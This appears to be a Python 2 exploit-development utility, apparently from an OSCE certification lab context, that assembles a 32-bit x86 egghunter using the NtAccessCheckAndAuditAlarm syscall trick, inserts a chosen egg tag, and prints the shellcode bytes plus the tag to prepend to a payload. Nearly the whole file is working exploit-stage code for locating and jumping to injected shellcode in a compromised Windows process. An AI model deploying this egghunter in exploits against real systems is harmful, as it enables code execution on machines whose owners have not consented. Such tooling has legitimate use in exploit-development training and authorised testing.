#!/usr/bin/python
# This script allows you to specify an egg, assembly an egghunter, and then print the bytecode to STDOUT
from keystone import *
import argparse
import sys

# From the OSCE lab
egghunter_NtAccessCheckAndAuditAlarm = """
loop_inc_page:;
	or dx, 0x0fff;

loop_inc_one:;
	inc edx;

loop_check:;
	push edx;
	push 0x2;
	pop eax;
	int 0x2e;
	cmp al,05;
	pop edx;

loop_check_8_valid:;
	je loop_inc_page;

is_egg:;
	mov eax, 0x00000000;
	mov edi, edx;
	scasd;
	jnz loop_inc_one;
	scasd;
	jnz loop_inc_one;

matched:;
	jmp edi;
"""

# Assemble our egg
def assemble(code):
	try:
		# Initialize engine in X86-32bit mode
		ks = Ks(KS_ARCH_X86, KS_MODE_32)
		encoding, count = ks.asm(code)
	except KsError as e:
		print("ERROR assembling egghunter: %s" %e)
		exit()

	return encoding

# Format the egg in chosen format
def format_egg(egg, format):
	egghunter = ""

	if format == "py":
		for byte in egg:
			egghunter += "\\x%0.2X" % byte
	elif format == "raw":
		for byte in egg:
			egghunter += chr(byte)

	return egghunter

# Write egg to raw file
def write_to_raw(egg, filename):
	file = open(filename, 'w+')
	file.write(egg)
	file.close()

# Convert text egg to hex format
def convert_egg_to_hex(egg):
	egg_hex = "0x"
	for char in egg:
		egg_hex += "%0.2X" % ord(char)

	return egg_hex

# Inserts the chosen egg into the chosen egghunter code
def replace_egg_in_egghunter(egg, code):
	return code.replace("0x00000000", egg, 1)

# Creates the final egg to prepend to shellcode
def produce_final_egg(egg):
	egg_hex = ""
	for i in range(0,2):
		for char in egg[::-1]:
			egg_hex += "\\x%0.2X" % ord(char)

	return egg_hex

# main
def main():
	# Start by obtaining user arguments
	parser = argparse.ArgumentParser(description='Generate_Egghunter.py\nBy: Rick Osgood')
	parser.add_argument("--egg", required=False, default="W00T", help="Egg in hex format. Default is 0x57303054 (W00T)")
	parser.add_argument("--egghunter", required=False, default=1, help="Choose an egghunter: 1-NtAccessCheckAndAuditAlarm (default)")
	parser.add_argument("--format", required=False, default="py", help="Output format: py (Default), raw")
	parser.add_argument("--filename", required=False, default="egghunter.raw", help="Filename for raw egghunter output format")
	args = parser.parse_args()

	egg = args.egg
	egghunter = int(args.egghunter)
	format = args.format
	filename = args.filename

	# Validate egghunter choice
	egghunters = [1]
	egghunters_names = ["NtAccessCheckAndAuditAlarm"]
	if egghunter not in egghunters:
		print "ERROR: Invalid egghunter chosen. Options are: " + str(egghunters)
		exit()

	# Validate format choice
	formats = ["py", "raw"]
	if format not in formats:
		print "ERROR: Invalid format chosen. Options are: " + str(formats)
		exit()

	# Validate Filename
	if format == "raw":
		if not filename:
			print "ERROR: No filename specified! RAW output requires --filename argument."
			exit()

	# Convert text egg to hex format
	egg_hex = convert_egg_to_hex(egg)

	print "[*] Using egghunter " + egghunters_names[egghunter - 1]
	print "[*] Using egg " + egg + " (" + egg_hex + ")"

	# Build egg based on chosen egghunter and specified egg
	code = ""
	if egghunter == 1:
		code = replace_egg_in_egghunter(egg_hex, egghunter_NtAccessCheckAndAuditAlarm)

	# Assemble egghunter
	egghunter_code = assemble(code)

	print "[*] Egghunter with length " + str(len(egghunter_code)) + " assembled"

	# Format into chosen format
	egghunter_code = format_egg(egghunter_code, format)

	if format == "raw":
		print "[*] Writing raw output to " + filename
		write_to_raw(egghunter_code, filename)
	elif format == "py":
		print "[*] Egghunter code: " + egghunter_code

	print "[*] Prepend this egg to your shellcode: " + produce_final_egg(egg)
	print "[*] Don't forget to add NOPS if your shellcode needs to extract!"

if __name__ == '__main__':
	main()
